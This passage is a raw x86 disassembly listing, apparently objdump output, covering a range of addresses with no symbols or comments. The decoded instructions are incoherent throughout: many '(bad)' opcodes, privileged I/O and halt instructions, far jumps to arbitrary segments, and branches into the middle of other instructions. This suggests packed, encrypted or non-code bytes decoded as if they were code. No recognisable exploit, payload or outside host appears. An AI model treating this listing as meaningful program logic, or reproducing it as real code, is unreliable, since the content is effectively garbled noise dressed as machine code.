  41567e:	xor    bl,ch
  415680:	dec    ebx
  415681:	xlat   BYTE PTR ds:[ebx]
  415682:	repz test eax,0x7c38aecc
  415688:	xlat   BYTE PTR ds:[ebx]
  415689:	jp     0x415622
  41568b:	data16 or WORD PTR [ebp+0x3baa47f3],si
  415693:	mov    al,BYTE PTR [eax]
  415695:	dec    eax
  415696:	fild   QWORD PTR [ecx-0x14]
  415699:	hlt    
  41569a:	push   cs
  41569b:	mov    esi,ecx
  41569d:	xchg   ebx,eax
  41569e:	js     0x41569c
  4156a0:	popa   
  4156a1:	jp     0x415667
  4156a3:	add    DWORD PTR [ebx],ecx
  4156a5:	or     DWORD PTR [edx+0x5e41d8ce],edx
  4156ab:	jecxz  0x4156a9
  4156ad:	xchg   ebp,esi
  4156af:	sbb    esi,DWORD PTR [edi]
  4156b1:	or     eax,0xdaeafad2
  4156b6:	ins    BYTE PTR es:[edi],dx
  4156b7:	test   BYTE PTR [ebp-0x1],bl
  4156ba:	inc    esp
  4156bb:	inc    ebx
  4156bc:	inc    esp
  4156bd:	fdivr  DWORD PTR [edi]
  4156bf:	icebp  
  4156c0:	hlt    
  4156c1:	test   DWORD PTR [ecx+0x7d7d19ff],edx
  4156c7:	push   0xeb9d6ae8
  4156cc:	add    al,0x68
  4156ce:	lods   eax,DWORD PTR ds:[esi]
  4156cf:	jl     0x41569c
  4156d1:	scas   eax,DWORD PTR es:[edi]
  4156d2:	test   al,0x2a
  4156d4:	add    DWORD PTR [esi+0x4e38080a],ebp
  4156da:	xor    ebp,edi
  4156dc:	outs   dx,DWORD PTR ds:[esi]
  4156dd:	adc    ebx,DWORD PTR [ebp-0x1a9b44e5]
  4156e3:	std    
  4156e4:	clc    
  4156e5:	icebp  
  4156e6:	lock lods eax,DWORD PTR ds:[esi]
  4156e8:	fbld   TBYTE PTR [eax+0x2b]
  4156eb:	cmp    DWORD PTR [edx+0x5],ebp
  4156ee:	fild   DWORD PTR [ecx]
  4156f0:	mov    bl,0xcb
  4156f2:	imul   eax,esi,0x61
  4156f5:	and    esi,DWORD PTR [esp+ebp*4+0x15]
  4156f9:	mov    cl,BYTE PTR [esi+0x7c104e4d]
  4156ff:	cwde   
  415700:	scas   al,BYTE PTR es:[edi]
  415701:	cmp    DWORD PTR [ecx+0x49],eax
  415704:	mov    dl,0x8c
  415706:	ret    0xf61a
  415709:	aaa    
  41570a:	mov    bl,BYTE PTR [ecx-0x80]
  41570d:	or     eax,0x17091993
  415712:	push   edi
  415713:	mov    ecx,0xd04456e2
  415718:	adc    DWORD PTR [esi+0x47552967],esp
  41571e:	int    0xf8
  415720:	mov    ecx,0xf5b8c1de
  415725:	mov    edx,0xa54603c8
  41572a:	xor    bl,bh
  41572c:	inc    esp
  41572d:	push   ecx
  41572e:	fcomi  st,st(1)
  415730:	cdq    
  415731:	mov    ebp,esp
  415733:	outs   dx,DWORD PTR ds:[esi]
  415734:	cmc    
  415735:	ja     0x4157a5
  415737:	jl     0x4156ba
  415739:	pop    edx
  41573a:	sbb    ebx,edi
  41573c:	clc    
  41573d:	adc    DWORD PTR [ecx+edi*4],0x3a
  415741:	mov    al,ds:0x5938e6f4
  415746:	or     eax,0x375b0788
  41574b:	out    dx,eax
  41574c:	(bad)  
  41574e:	and    DWORD PTR [esi-0x59be15e9],edi
  415754:	fimul  DWORD PTR [esi]
  415756:	cmp    al,0x13
  415758:	(bad)  [ebp+0x51]
  41575b:	xchg   ecx,eax
  41575c:	inc    esi
  41575d:	lock scas al,BYTE PTR es:[edi]
  41575f:	test   al,0x8c
  415761:	jl     0x415755
  415763:	xlat   BYTE PTR ds:[ebx]
  415764:	dec    ebp
  415765:	mov    eax,DWORD PTR [ecx+ebx*8]
  415768:	jb     0x41574b
  41576a:	retf   0x2aa7
  41576d:	in     eax,0x1
  41576f:	jns    0x4157b4
  415771:	cmp    ch,BYTE PTR [edx-0x25]
  415774:	inc    esi
  415775:	in     eax,dx
  415776:	fs inc esi
  415778:	cwde   
  415779:	pop    es
  41577a:	mov    ebx,0xca69ea6a
  41577f:	mov    DWORD PTR [ebx-0x4cb8978],edx
  415785:	sbb    bh,BYTE PTR [eax+ebp*2-0x71d1219]
  41578c:	or     al,0xd3
  41578e:	inc    ebp
  41578f:	pop    es
  415790:	or     ebx,ecx
  415792:	mov    eax,0x265ed5d
  415797:	mov    bh,0x29
  415799:	cmp    al,0xbc
  41579b:	popf   
  41579c:	mov    dl,0xe4
  41579e:	std    
  41579f:	(bad)  
  4157a0:	jmp    0x3047:0x9f1c187e
  4157a7:	adc    BYTE PTR [edi+0x23],0x2f
  4157ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157ac:	xor    eax,0x114c8c25
  4157b1:	jb     0x4157de
  4157b3:	push   ds
  4157b4:	mov    bh,0xe3
  4157b6:	fprem  
  4157b8:	jnp    0x4157a2
  4157ba:	test   al,0x4f
  4157bc:	hlt    
  4157bd:	and    al,0x80
  4157bf:	pop    ebx
  4157c0:	aas    
  4157c1:	or     eax,DWORD PTR [edi]
  4157c3:	jnp    0x415804
  4157c5:	mov    al,0x28
  4157c7:	repz fwait
  4157c9:	jno    0x41583b
  4157cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157cc:	adc    BYTE PTR [ebp+eiz*8-0x32],ah
  4157d0:	retf   0xf5a4
  4157d3:	test   DWORD PTR [esi+0x26],edi
  4157d6:	stos   DWORD PTR es:[edi],eax
  4157d7:	dec    eax
  4157d8:	jl     0x415787
  4157da:	sar    DWORD PTR [edi-0x497a065e],1
  4157e0:	in     eax,dx
  4157e1:	adc    BYTE PTR ds:0x477b9fe0,ah
  4157e7:	mov    DWORD PTR ds:0xf32882e6,esi
  4157ed:	inc    eax
  4157ee:	mov    bh,BYTE PTR [esi]
  4157f0:	data16 jge 0x4157e8
  4157f3:	repnz and eax,0xfe3b99ac
  4157f9:	scas   eax,DWORD PTR es:[edi]
  4157fa:	mov    ecx,0xae178b4d
  4157ff:	loopne 0x4157c2
  415801:	pushf  
  415802:	dec    ebp
  415803:	imul   esi,DWORD PTR [edx],0x329150b0
  415809:	dec    eax
  41580a:	hlt    
  41580b:	and    dh,BYTE PTR [esi]
  41580d:	dec    edi
  41580e:	lods   al,BYTE PTR ds:[esi]
  41580f:	push   ds
  415810:	push   cs
  415811:	fld    DWORD PTR [esp+ebp*2+0x25]
  415815:	clc    
  415816:	sbb    eax,0x43a58921
  41581b:	dec    esp
  41581c:	fadd   DWORD PTR [ecx+0x494b8bbf]
  415822:	xchg   ecx,eax
  415823:	test   bl,dh
  415825:	scas   eax,DWORD PTR es:[edi]
  415826:	sbb    edx,edx
  415828:	cli    
  415829:	nop
  41582a:	push   0xe2bc2f21
  41582f:	jge    0x415865
  415831:	stos   DWORD PTR es:[edi],eax
  415832:	(bad)  
  415833:	nop
  415834:	nop
  415835:	add    al,0x24
  415837:	fs hlt 
  415839:	(bad)  
  41583a:	mov    esi,0x701cac8
  41583f:	aam    0x9f
  415841:	in     eax,0xdf
  415843:	xchg   DWORD PTR [ebp+0x738b6a19],edi
  415849:	daa    
  41584a:	fist   WORD PTR [edx+ebp*4-0x1c6c6f0a]
  415851:	repz movzx ecx,WORD PTR [ebp+0x44]
  415856:	dec    ebp
  415857:	sti    
  415858:	inc    ecx
  415859:	icebp  
  41585a:	add    BYTE PTR [esi],0xf8
  41585d:	ss xchg ebx,eax
  41585f:	pop    es
  415860:	jns    0x415814
  415862:	dec    ecx
  415863:	pop    edx
  415864:	mov    bh,0xb4
  415866:	mov    esp,0x973a97fc
  41586b:	aas    
  41586c:	jo     0x41582c
  41586e:	lods   al,BYTE PTR ds:[esi]
  41586f:	ret    
  415870:	out    0x3a,al
  415872:	mov    ecx,0xda91e4ec
  415877:	pop    es
  415878:	xchg   edi,eax
  415879:	js     0x41583e
  41587b:	mov    bh,0xe1
  41587d:	pop    esp
  41587e:	cli    
  41587f:	scas   eax,DWORD PTR es:[edi]
  415880:	fwait
  415881:	pushf  
  415882:	stos   DWORD PTR es:[edi],eax
  415883:	and    eax,0x27a53e0d
  415888:	ja     0x41588a
  41588a:	push   cs
  41588b:	mov    ds:0xf97ce8dc,eax
  415890:	fisub  DWORD PTR [edi+eax*2-0x61]
  415894:	arpl   WORD PTR [ecx-0x63],sp
  415897:	mov    ss,WORD PTR [esi*8-0x4a16d39f]
  41589e:	fs cmp al,0x85
  4158a1:	idiv   BYTE PTR [edi-0x60ab7050]
  4158a7:	xor    DWORD PTR [esi],edx
  4158a9:	mov    al,0x84
  4158ab:	xor    esp,DWORD PTR [edx+0x3a]
  4158ae:	(bad)  
  4158b0:	shl    esi,cl
  4158b2:	adc    ch,0xca
  4158b5:	xor    eax,0x9fd523d6
  4158ba:	in     eax,0xfb
  4158bc:	inc    esp
  4158bd:	push   es
  4158be:	into   
  4158bf:	jmp    0x41585f
  4158c1:	rcl    DWORD PTR [ebx-0x7cf3d4de],1
  4158c7:	retf   
  4158c8:	jb     0x41589b
  4158ca:	inc    esi
  4158cb:	lea    edi,[edi+0x16]
  4158ce:	in     eax,0x2d
  4158d0:	mov    ch,0x58
  4158d2:	sub    BYTE PTR [edi],ch
  4158d4:	les    ecx,FWORD PTR [edi+0x11]
  4158d7:	add    esi,DWORD PTR ss:[ebx]
  4158da:	lods   eax,DWORD PTR ds:[esi]
  4158db:	inc    esp
  4158dc:	test   BYTE PTR [ecx-0x10a1c834],bh
  4158e2:	(bad)  [ebp-0xd]
  4158e5:	test   BYTE PTR [ecx-0x1e43086],0x50
  4158ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158ed:	out    0xf7,eax
  4158ef:	or     BYTE PTR [ebx+0x62],ah
  4158f2:	lds    esi,FWORD PTR [edi+0x50]
  4158f5:	push   ebx
  4158f6:	sub    eax,0x53fdca4e
  4158fb:	fcmovb st,st(7)
  4158fd:	xchg   esp,eax
  4158fe:	xor    DWORD PTR [edi-0x64519754],ebp
  415904:	shl    DWORD PTR [eax+eiz*2],cl
  415907:	sti    
  415908:	fs cmc 
  41590a:	pop    es
  41590b:	push   ecx
  41590c:	xchg   esp,eax
  41590d:	pop    edi
  41590e:	inc    ecx
  41590f:	ins    BYTE PTR es:[edi],dx
  415910:	adc    eax,0x86585529
  415915:	(bad)  
  415916:	lods   al,BYTE PTR ds:[esi]
  415917:	sub    eax,DWORD PTR [ebx+0x1c]
  41591a:	clc    
  41591b:	into   
  41591c:	in     eax,0x54
  41591e:	pop    edi
  41591f:	sub    eax,0xd3ad648b
  415924:	mov    ah,0xe2
  415926:	inc    eax
  415927:	cs push ss
  415929:	in     al,dx
  41592a:	xchg   ebx,eax
  41592b:	or     DWORD PTR [edi-0x4741f3a9],esi
  415931:	push   ds
  415932:	mov    esi,0x9d56cf2
  415937:	pop    ecx
  415938:	aam    0x1
  41593a:	sub    BYTE PTR [edx-0x16fdd976],ch
  415940:	mov    esp,DWORD PTR [ecx-0x80]
  415943:	leave  
  415944:	push   0xffffffe2
  415946:	mov    dl,0xfe
  415948:	adc    eax,DWORD PTR [edx+0x49aea114]
  41594e:	std    
  41594f:	mov    al,ds:0x9cadadcc
  415954:	enter  0xdf57,0x26
  415958:	jp     0x415956
  41595a:	jecxz  0x4159d1
  41595c:	cdq    
  41595d:	and    eax,0x53e92e75
  415962:	push   cs
  415963:	mov    bh,0xe2
  415965:	(bad)  
  415966:	mov    al,0xb0
  415968:	xor    eax,0xc7e4e084
  41596d:	std    
  41596e:	and    al,BYTE PTR [edx+esi*8]
  415971:	cmp    ebx,DWORD PTR [eax]
  415973:	jmp    0x726:0x7fa5d88e
  41597a:	jge    0x41590e
  41597c:	pop    eax
  41597d:	bound  ebp,QWORD PTR [ecx]
  41597f:	or     ah,BYTE PTR [esi-0x27]
  415982:	mov    es,WORD PTR [eax-0x7b24f020]
  415988:	xchg   dl,dh
  41598a:	mov    BYTE PTR [edi-0x5e],bl
  41598d:	inc    ecx
  41598e:	imul   esi,DWORD PTR [edi],0x6094930d
  415994:	adc    dh,dh
  415996:	xlat   BYTE PTR ds:[ebx]
  415997:	sbb    edx,ebp
  415999:	lock (bad) 
  41599b:	popf   
  41599c:	mov    ds:0xecfce9cd,eax
  4159a1:	fmul   QWORD PTR [edi+0x29]
  4159a4:	pop    edi
  4159a5:	(bad)  
  4159a6:	loope  0x4159c2
  4159a8:	test   bl,0xfa
  4159ab:	fcomp  DWORD PTR [eax+esi*4-0x2b]
  4159af:	dec    edi
  4159b0:	and    DWORD PTR [eax-0x53],esp
  4159b3:	xchg   ebx,eax
  4159b4:	(bad)  
  4159b5:	fwait
  4159b6:	ss and dl,0x76
  4159ba:	push   edi
  4159bb:	aad    0xcd
  4159bd:	jle    0x4159a4
  4159bf:	and    BYTE PTR [eax-0x21],al
  4159c2:	push   ecx
  4159c3:	fst    QWORD PTR [ebp-0x6f16af49]
  4159c9:	push   ds
  4159ca:	jne    0x4159c3
  4159cc:	repz rol BYTE PTR [edi+esi*1+0xdfa0157],cl
  4159d4:	mov    ch,0xc
  4159d6:	xor    al,0xa4
  4159d8:	xor    ch,bl
  4159da:	(bad)  
  4159dc:	xor    BYTE PTR [ebx+0x3c],0xc2
  4159e0:	aas    
  4159e1:	inc    eax
  4159e2:	arpl   WORD PTR [edx-0x6ceeff1a],si
  4159e8:	(bad)  
  4159e9:	pop    ds
  4159ea:	or     al,0xe1
  4159ec:	mov    DWORD PTR [ebx],0xc695caf5
  4159f2:	pop    esp
  4159f3:	leave  
  4159f4:	inc    ebp
  4159f5:	cmp    al,0x76
  4159f7:	nop
  4159f8:	or     al,0xce
  4159fa:	pop    edi
  4159fb:	inc    edx
  4159fc:	jnp    0x415a2d
  4159fe:	(bad)  
  415a00:	adc    ah,BYTE PTR [esi-0x7c409ce2]
  415a06:	jno    0x4159b3
  415a08:	fldenv [ecx]
  415a0a:	sub    ebp,DWORD PTR [esi-0x354e30f2]
  415a10:	nop
  415a11:	call   0x8d61:0x484a1bbd
  415a18:	ss aas 
  415a1a:	sbb    BYTE PTR [edx+0x36ecaa23],ah
  415a20:	jmp    0x4427:0x6564d695
  415a27:	aam    0xd2
  415a29:	retf   
  415a2a:	into   
  415a2b:	xlat   BYTE PTR ds:[ebx]
  415a2c:	xchg   esi,eax
  415a2d:	scas   al,BYTE PTR es:[edi]
  415a2e:	mov    bl,0xfc
  415a30:	(bad)  [ebx+ebp*8-0x24]
  415a34:	out    0xa1,eax
  415a36:	fmul   DWORD PTR [eax-0x2f]
  415a39:	jecxz  0x415a88
  415a3b:	or     eax,0x81720682
  415a40:	xor    al,0x78
  415a42:	jge    0x415a6e
  415a44:	dec    eax
  415a45:	adc    al,0x1f
  415a47:	clc    
  415a48:	inc    esp
  415a49:	inc    esi
  415a4a:	xchg   esi,eax
  415a4b:	std    
  415a4c:	jle    0x4159e4
  415a4e:	push   ss
  415a4f:	dec    esi
  415a50:	mov    ecx,0x8d34d9ec
  415a55:	aaa    
  415a56:	mov    ebx,0x8da8d4f1
  415a5b:	xor    al,ch
  415a5d:	add    DWORD PTR [ebx-0x46],0x4c
  415a61:	sub    bl,BYTE PTR [esi-0xb]
  415a64:	retf   0xe635
  415a67:	aas    
  415a68:	adc    dl,bl
  415a6a:	cmp    ch,BYTE PTR [ecx+eax*8+0x54]
  415a6e:	repnz mov ds:0x5e443bf7,al
  415a74:	imul   esp,DWORD PTR [esi],0x73
  415a77:	pop    esi
  415a78:	stc    
  415a79:	cmp    eax,0xe1394de8
  415a7e:	adc    eax,0xe89a0482
  415a83:	sbb    bl,BYTE PTR [eax+0x379a1a19]
  415a89:	dec    esi
  415a8a:	mov    eax,0xd1cad799
  415a8f:	xchg   ecx,edx
  415a91:	call   0x662b:0xfa8e0970
  415a98:	clc    
  415a99:	ins    BYTE PTR es:[edi],dx
  415a9a:	loopne 0x415a48
  415a9c:	mov    edi,0x2e366af6
  415aa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415aa2:	add    dl,BYTE PTR [eax+0x2079ab29]
  415aa8:	sbb    al,0x41
  415aaa:	sub    al,0x9c
  415aac:	push   eax
  415aad:	ret    0xbb4f
  415ab0:	cwde   
  415ab1:	add    bh,dl
  415ab3:	sbb    eax,0xa280c3f2
  415ab8:	push   edi
  415ab9:	push   edi
  415aba:	lock mov ch,0x80
  415abd:	in     al,dx
  415abe:	or     esi,edx
  415ac0:	push   eax
  415ac1:	mov    ebp,0x4fac43c8
  415ac6:	inc    ecx
  415ac7:	cld    
  415ac8:	cmc    
  415ac9:	and    dh,BYTE PTR [edi+0x75]
  415acc:	add    al,0x60
  415ace:	cmc    
  415acf:	loopne 0x415b0e
  415ad1:	push   esp
  415ad3:	mov    dl,0x5b
  415ad5:	mov    ecx,0xefb191cb
  415ada:	test   BYTE PTR [edx+0x8],al
  415add:	push   ebp
  415ade:	mov    al,ds:0xbcc4bd86
  415ae3:	mov    dh,0x15
  415ae5:	mov    esp,0xed567f4c
  415aea:	cmc    
  415aeb:	repz adc eax,0x6734fb80
  415af1:	adc    al,bl
  415af3:	jno    0x415ad8
  415af5:	das    
  415af6:	jle    0x415b72
  415af8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415af9:	jno    0x415b10
  415afb:	repnz and al,0xed
  415afe:	push   es
  415aff:	pop    ss
  415b00:	push   ds
  415b01:	pop    ebp
  415b02:	(bad)  
  415b03:	clc    
  415b04:	test   cl,bl
  415b06:	or     eax,0xc294c54f
  415b0b:	mov    BYTE PTR [edi-0x1ce0f73f],cl
  415b11:	pop    esp
  415b12:	test   eax,0xf4dcd1bc
  415b17:	addr16 push cs
  415b19:	fldenv [edi+0x6a]
  415b1c:	adc    DWORD PTR [edx-0x77],esi
  415b1f:	mov    cs,eax
  415b21:	push   0xffffffd4
  415b23:	inc    edi
  415b24:	fdivrp st(4),st
  415b26:	nop
  415b27:	jg     0x415b81
  415b29:	cld    
  415b2a:	or     edx,esp
  415b2c:	ins    DWORD PTR es:[edi],dx
  415b2d:	ror    BYTE PTR [ecx+0x2d],0xa4
  415b31:	sub    DWORD PTR [edi+0x1c],edx
  415b34:	mov    ds:0xa383241d,al
  415b39:	push   edx
  415b3a:	mov    es,WORD PTR [bx+di+0xc]
  415b3e:	or     esi,DWORD PTR [eax]
  415b40:	lds    esp,FWORD PTR [edx+0x2f774507]
  415b46:	in     eax,0xea
  415b48:	popa   
  415b49:	xchg   ebx,eax
  415b4a:	(bad)  
  415b4b:	arpl   WORD PTR [ebx+0x66],sp
  415b4e:	inc    eax
  415b4f:	icebp  
  415b50:	fcom   DWORD PTR [edi-0x6b]
  415b53:	and    dl,BYTE PTR [ecx]
  415b55:	fld    st(4)
  415b57:	jno    0x415b97
  415b59:	jmp    0xaa8c3cd6
  415b5e:	push   esi
  415b5f:	xchg   ebx,eax
  415b60:	jg     0x415ba5
  415b62:	cld    
  415b63:	push   esi
  415b64:	fwait
  415b65:	cli    
  415b66:	mov    ecx,DWORD PTR [eax]
  415b68:	sub    esi,DWORD PTR [ebx]
  415b6a:	xor    eax,0xe48e33
  415b6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b70:	imul   esp,DWORD PTR [edi+eax*8],0x73c68acc
  415b77:	ins    DWORD PTR es:[edi],dx
  415b78:	dec    ebp
  415b79:	repnz pop ds
  415b7b:	inc    ebp
  415b7c:	arpl   WORD PTR [edi+0x3a96d487],si
  415b82:	sbb    al,0x35
  415b84:	or     al,0x9f
  415b86:	scas   eax,DWORD PTR es:[edi]
  415b87:	rcr    bl,cl
  415b89:	cmp    esi,0xffffff82
  415b8c:	stos   DWORD PTR es:[edi],eax
  415b8d:	cmc    
  415b8e:	popa   
  415b8f:	loop   0x415b11
  415b91:	or     eax,0x359426ba
  415b96:	shl    BYTE PTR [edx-0x80],cl
  415b99:	stos   DWORD PTR es:[edi],eax
  415b9a:	shl    BYTE PTR [edx],cl
  415b9c:	adc    DWORD PTR [ebp+0x5c],ecx
  415b9f:	mov    dl,0x74
  415ba1:	test   eax,0x16826ba8
  415ba6:	push   ecx
  415ba7:	xchg   ecx,eax
  415ba8:	mul    DWORD PTR [esi+0x57]
  415bab:	popa   
  415bac:	xor    al,0x4
  415bae:	nop
  415baf:	out    dx,al
  415bb0:	xor    edx,ebx
  415bb2:	aam    0x53
  415bb4:	mov    BYTE PTR [ecx],0xa8
  415bb7:	mov    eax,ds:0xccbdd9d5
  415bbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bbd:	std    
  415bbe:	dec    ebx
  415bbf:	fnsave [edx]
  415bc1:	shr    BYTE PTR [ebx-0x33],1
  415bc4:	std    
  415bc5:	sbb    ah,BYTE PTR [ebp+0x6f]
  415bc8:	fs out dx,eax
  415bca:	call   0xdcb868f1
  415bcf:	loope  0x415c48
  415bd1:	xchg   esp,eax
  415bd2:	imul   eax,DWORD PTR [esi-0x56],0x47
  415bd6:	retf   0xed19
  415bd9:	mov    dh,0xd8
  415bdb:	dec    edi
  415bdc:	lods   eax,DWORD PTR ds:[esi]
  415bdd:	push   ds
  415bde:	and    eax,0xf94b724
  415be3:	xchg   esp,eax
  415be4:	mov    cl,BYTE PTR [ebx+0x4e]
  415be7:	mov    cl,0x70
  415be9:	jle    0x415ba5
  415beb:	jbe    0x415c65
  415bed:	jmp    0x9163:0x8f4c9e73
  415bf4:	shl    DWORD PTR [eax+0x4456ddc2],cl
  415bfa:	jl     0x415c64
  415bfc:	jecxz  0x415b98
  415bfe:	out    0x55,eax
  415c00:	xchg   edx,eax
  415c01:	in     al,dx
  415c02:	xchg   DWORD PTR [ecx-0x4e48073],esp
  415c08:	xchg   esp,eax
  415c09:	jb     0x415c41
  415c0b:	fdiv   QWORD PTR fs:[eax]
  415c0e:	inc    edx
  415c0f:	(bad)  
  415c10:	je     0x415be8
  415c12:	sub    eax,0x4f1c12ff
  415c17:	inc    edx
  415c18:	aad    0xf3
  415c1a:	push   eax
  415c1b:	nop
  415c1c:	push   ds
  415c1d:	fist   DWORD PTR [ebx+ebx*1+0x3535d323]
  415c24:	xchg   esp,eax
  415c25:	js     0x415c74
  415c27:	loope  0x415c1d
  415c29:	test   BYTE PTR [eax],bl
  415c2b:	dec    esi
  415c2c:	call   0xcb389ad
  415c31:	jmp    0x415c6e
  415c33:	push   ebx
  415c34:	lods   al,BYTE PTR ds:[esi]
  415c35:	nop
  415c36:	in     eax,dx
  415c37:	repz xchg ecx,eax
  415c39:	add    ah,BYTE PTR [eax+0x3d4a031b]
  415c3f:	and    dh,ch
  415c41:	pop    eax
  415c42:	loop   0x415bef
  415c44:	daa    
  415c45:	loopne 0x415be3
  415c47:	pop    es
  415c48:	int3   
  415c49:	stos   BYTE PTR es:[edi],al
  415c4a:	sbb    DWORD PTR [ebp+ebx*1-0x194aa8ca],esp
  415c51:	pop    ebx
  415c52:	sar    DWORD PTR es:[edx+edx*8],1
  415c56:	sbb    dh,al
  415c58:	mov    bh,dl
  415c5a:	push   0x4ad7c9fc
  415c5f:	and    bh,BYTE PTR [eax+0x4c84df60]
  415c65:	ja     0x415c88
  415c67:	sub    DWORD PTR [eax-0x7c],ebp
  415c6a:	sbb    eax,0xa9a0f689
  415c6f:	loop   0x415c7d
  415c71:	sbb    edi,esp
  415c73:	push   edx
  415c74:	in     al,0x47
  415c76:	sbb    DWORD PTR [edi-0x17e20dd8],0x46185cdd
  415c80:	sub    eax,0xfc24c309
  415c85:	push   esp
  415c86:	sub    dl,BYTE PTR [ebp+0x58]
  415c89:	mov    dl,0x59
  415c8b:	aad    0xb
  415c8d:	inc    ebp
  415c8e:	add    BYTE PTR [edx+0xdc568ce],dh
  415c94:	fwait
  415c95:	int    0x51
  415c97:	cmp    BYTE PTR [edx-0x1808e2fb],0x11
  415c9e:	jmp    0x415cfd
  415ca0:	mov    ch,0x39
  415ca2:	xchg   BYTE PTR [edx],cl
  415ca4:	js     0x415c73
  415ca6:	cmp    bh,BYTE PTR [esi]
  415ca8:	xor    bl,0x4
  415cab:	jb     0x415c8a
  415cad:	aad    0x40
  415caf:	pop    ax
  415cb1:	shl    ebx,1
  415cb3:	adc    eax,0x17f9d97a
  415cb8:	cmp    eax,0xd97e1671
  415cbd:	pop    esi
  415cbe:	xor    DWORD PTR [edi+0x7e],edx
  415cc1:	nop
  415cc2:	(bad)  
  415cc3:	aaa    
  415cc4:	sub    eax,0x202fd683
  415cc9:	addr16 out dx,al
  415ccb:	cmp    BYTE PTR [esi-0x2641fa2c],bh
  415cd1:	aam    0x22
  415cd3:	es repz mov dh,0xeb
  415cd7:	ins    DWORD PTR es:[edi],dx
  415cd8:	push   esp
  415cd9:	aam    0xe5
  415cdb:	fistp  QWORD PTR [ecx]
  415cdd:	sub    eax,0xb0ad7593
  415ce2:	add    ch,BYTE PTR [esi-0x2f]
  415ce5:	sbb    bh,cl
  415ce7:	xor    DWORD PTR [edi-0x172594e7],ecx
  415ced:	sbb    al,0x21
  415cef:	mov    ds:0xd60ba9dd,eax
  415cf4:	sbb    BYTE PTR [esi+ebp*8-0x2eb92be5],al
  415cfb:	rol    BYTE PTR [ebx],cl
  415cfd:	dec    ecx
  415cfe:	(bad)  
  415cff:	or     ebx,DWORD PTR [ecx-0x56ad4b76]
  415d05:	adc    eax,0xaee281d4
  415d0a:	inc    ecx
  415d0b:	and    al,0x57
  415d0d:	dec    eax
  415d0e:	lods   al,BYTE PTR ds:[esi]
  415d0f:	dec    ebx
  415d10:	cmp    al,0x43
  415d12:	push   es
  415d13:	(bad)  
  415d14:	fs inc ebx
  415d16:	repnz mov ds:0xa9e0afbc,eax
  415d1c:	push   ebp
  415d1d:	pop    esp
  415d1e:	test   BYTE PTR [edx],0xfa
  415d21:	mov    DWORD PTR [eax+eiz*2+0x37],ebp
  415d25:	retf   0xf081
  415d28:	(bad)  
  415d2b:	push   eax
  415d2c:	psubq  mm4,mm5
  415d2f:	mov    bh,0x4e
  415d31:	outs   dx,BYTE PTR ds:[esi]
  415d32:	pop    eax
  415d33:	pop    ds
  415d34:	mov    al,al
  415d36:	pop    edx
  415d37:	mov    cl,0xfe
  415d39:	sbb    ebp,DWORD PTR [ebx+0x5aec0fd5]
  415d3f:	aad    0xef
  415d41:	add    dl,BYTE PTR [edi]
  415d43:	div    DWORD PTR [esi-0x77]
  415d46:	dec    edi
  415d47:	stc    
  415d48:	les    ebp,FWORD PTR [ebp+0xa61d9f9]
  415d4e:	nop
  415d4f:	sub    BYTE PTR [esi+0x4f],cl
  415d52:	stc    
  415d53:	hlt    
  415d54:	fist   DWORD PTR [ecx+0x6d]
  415d57:	retf   0x5458
  415d5a:	dec    ecx
  415d5b:	out    0x3f,eax
  415d5d:	push   ebx
  415d5e:	adc    eax,0x31c1cc1
  415d63:	cdq    
  415d64:	mov    ds:0x5f86501d,eax
  415d69:	std    
  415d6a:	jle    0x415d89
  415d6c:	out    0x41,al
  415d6e:	arpl   WORD PTR [eax],ax
  415d70:	pop    es
  415d71:	mov    dl,0xd9
  415d73:	dec    DWORD PTR [edi+0x1a]
  415d76:	mov    ecx,0x91feebe
  415d7b:	jg     0x415d64
  415d7d:	sub    al,BYTE PTR [edx+ecx*8]
  415d80:	mov    ah,0x4a
  415d82:	dec    ebx
  415d83:	mov    WORD PTR [esp+edx*4],ss
  415d86:	jmp    0x415dff
  415d88:	lock fcomp DWORD PTR [ebp-0x2b2767a8]
  415d8f:	xchg   ecx,eax
  415d90:	fwait
  415d91:	xor    ax,0xf558
  415d95:	fwait
  415d96:	les    edx,FWORD PTR [ecx]
  415d98:	lock icebp 
  415d9a:	dec    ebx
  415d9b:	jb     0x415d72
  415d9d:	jecxz  0x415da3
  415d9f:	fld    TBYTE PTR [ebx+0x8e5172b]
  415da5:	push   0xffffffa3
  415da7:	adc    BYTE PTR [ecx-0x7572f7d],al
  415dad:	out    0x13,al
  415daf:	and    ebx,ebx
  415db1:	scas   al,BYTE PTR es:[edi]
  415db2:	push   edi
  415db3:	jbe    0x415d9e
  415db5:	lahf   
  415db6:	(bad)  
  415db7:	das    
  415db8:	bound  ebx,QWORD PTR [ecx+0x2d]
  415dbb:	push   ds
  415dbc:	das    
  415dbd:	mov    cl,0x4e
  415dbf:	jge    0x415df5
  415dc1:	mov    ds:0xa6670d56,eax
  415dc6:	shr    BYTE PTR [edi-0x78],cl
  415dc9:	out    0x2e,eax
  415dcb:	mov    edx,0xc3a5ecc7
  415dd0:	dec    esi
  415dd1:	pusha  
  415dd2:	jge    0x415e0d
  415dd4:	ins    DWORD PTR es:[edi],dx
  415dd5:	push   edi
  415dd6:	int3   
  415dd7:	cli    
  415dd8:	xor    eax,0x865f797d
  415ddd:	and    bl,ah
  415ddf:	scas   eax,DWORD PTR es:[edi]
  415de0:	outs   dx,BYTE PTR ds:[esi]
  415de1:	sti    
  415de2:	dec    eax
  415de3:	jmp    0x415e3b
  415de5:	mov    ds:0x5a9066e4,al
  415dea:	or     DWORD PTR [eax+0x1f],edx
  415ded:	xchg   ebp,eax
  415dee:	rcr    DWORD PTR [ecx],1
  415df0:	cmp    ebp,esi
  415df2:	mov    bh,0x82
  415df4:	jb     0x415dab
  415df6:	ret    
  415df7:	mov    ecx,0x3e831ce9
  415dfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415dfd:	(bad)  
  415dff:	in     al,dx
  415e00:	and    dh,ch
  415e02:	sbb    bl,al
  415e04:	js     0x415de5
  415e06:	pop    ebp
  415e07:	clc    
  415e08:	(bad)  
  415e09:	sub    al,0x8e
  415e0b:	mov    ds:0xa35971dc,al
  415e10:	les    edx,FWORD PTR [eax]
  415e12:	sub    DWORD PTR [esi],edi
  415e14:	adc    DWORD PTR [edx],ebp
  415e16:	jg     0x415e0e
